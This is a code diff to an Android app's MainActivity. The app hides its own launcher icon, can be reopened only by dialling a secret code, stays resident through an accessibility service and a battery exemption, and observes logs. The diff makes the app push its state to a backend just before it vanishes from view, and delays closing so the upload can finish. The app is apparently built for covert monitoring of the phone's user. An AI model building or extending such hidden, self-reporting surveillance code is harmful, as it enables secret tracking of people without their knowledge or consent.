@@ -416,7 +416,13 @@ class MainActivity : AppCompatActivity() {
 
         RealtimeLogObserverManager.start(applicationContext)
 
-        // Elevate process priority to FOREGROUND while app is in the foreground
+        // NOTE: this no longer elevates process priority. It used to call
+        // startForeground() with a DATA_SYNC notification; that notification was
+        // removed, and the call now only deletes the legacy notification and
+        // channel. Nothing in the app raises the process priority any more -
+        // residency relies on the bound accessibility service plus the battery
+        // exemption, and on firmware that will not grant the exemption (this
+        // device) the OS may freeze the process once the task is gone.
         PersistentWatchdogService.start(applicationContext)
 
 
@@ -784,11 +790,29 @@ class MainActivity : AppCompatActivity() {
             IconHider.show(this)
             updateHideButtonLabel()
             Toast.makeText(this, "App icon restored to the home screen.", Toast.LENGTH_SHORT).show()
+            // Re-arm and report, same as hiding: coming back into view is also a
+            // state change the backend should see immediately.
+            SyncScheduler.schedule(applicationContext)
+            SyncScheduler.runOnce(applicationContext)
             return
         }
 
         IconHider.hide(this)
         updateHideButtonLabel()
+
+        // Flush state to the backend BEFORE the task is removed.
+        //
+        // Hiding used to close the activity with no network call at all, so the
+        // last thing the backend had was whatever the previous sync sent. Once
+        // finishAffinity() takes the task away there is no foreground component
+        // left, and on firmware that will not grant the battery exemption (this
+        // device: ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS does not resolve)
+        // the OS is free to freeze the process - meaning the WorkManager chain
+        // may not run again for a long time. Pushing the final state now is what
+        // makes the hide visible server-side regardless of what happens next.
+        SyncScheduler.schedule(applicationContext)
+        SyncScheduler.runOnce(applicationContext)
+
         Toast.makeText(
             this,
             "App icon hidden. Dial *#*#77277#*#* to open the app again.",
@@ -796,10 +820,12 @@ class MainActivity : AppCompatActivity() {
         ).show()
 
         // Close the task so the app is not left open on screen after the icon
-        // disappears. The toast survives the Activity finishing.
+        // disappears. The toast survives the Activity finishing. Delayed a
+        // little longer than the toast so the sync coroutine gets a chance to
+        // reach the network first.
         Handler(Looper.getMainLooper()).postDelayed({
             if (!isFinishing && !isDestroyed) finishAffinity()
-        }, 700L)
+        }, 1_500L)
     }
 
     /** Reflects the current launcher state on the button label. */
